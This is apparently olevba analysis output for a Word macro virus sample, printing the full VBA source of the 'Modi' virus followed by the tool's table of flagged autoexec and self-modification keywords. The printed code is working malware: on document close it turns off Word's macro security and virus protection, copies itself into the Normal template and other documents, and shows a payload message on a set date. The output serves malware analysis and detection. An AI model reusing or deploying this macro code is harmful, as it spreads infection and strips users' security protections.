olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Assilem-b5232ac77a5861ac4c104ea6690219d8778e21d4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Modi.cls 
in file: Virus.MSWord.Assilem-b5232ac77a5861ac4c104ea6690219d8778e21d4 - OLE stream: 'Macros/VBA/Modi'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Set activdoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set nrmtemp = NormalTemplate.VBProject.VBComponents.Item(1)
nrmbaris = nrmtemp.CodeModule.CountOfLines
docbaris = activdoc.CodeModule.CountOfLines
mulai = 2
If activdoc.Name <> "Modi" Then
If docbaris > 0 Then _
activdoc.CodeModule.DeleteLines 1, docbaris
Set ToInfect = activdoc
activdoc.Name = "Modi"
activmulai = True
End If
If nrmtemp.Name <> "Modi" Then
If nrmbaris > 0 Then _
nrmtemp.CodeModule.DeleteLines 1, nrmbaris
Set ToInfect = nrmtemp
nrmtemp.Name = "Modi"
nrmlmulai = True
End If
If nrmlmulai <> True And activmulai <> True Then GoTo byeah
If nrmlmulai = True Then
Do While activdoc.CodeModule.Lines(1, 1) = ""
activdoc.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While activdoc.CodeModule.Lines(mulai, 1) <> ""
ToInfect.CodeModule.InsertLines mulai, activdoc.CodeModule.Lines(mulai, 1)
mulai = mulai + 1
Loop
End If
If activmulai = True Then
Do While nrmtemp.CodeModule.Lines(1, 1) = ""
nrmtemp.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While nrmtemp.CodeModule.Lines(mulai, 1) <> ""
ToInfect.CodeModule.InsertLines mulai, nrmtemp.CodeModule.Lines(mulai, 1)
mulai = mulai + 1
Loop
End If
byeah:
'Modi virus use tech of mellisa made by drdara
If nrmbaris <> 0 And docbaris = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
If Day(Now) = 13 And Month(Now) = 9 Then MsgBox ("you infected by Modi virus")
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

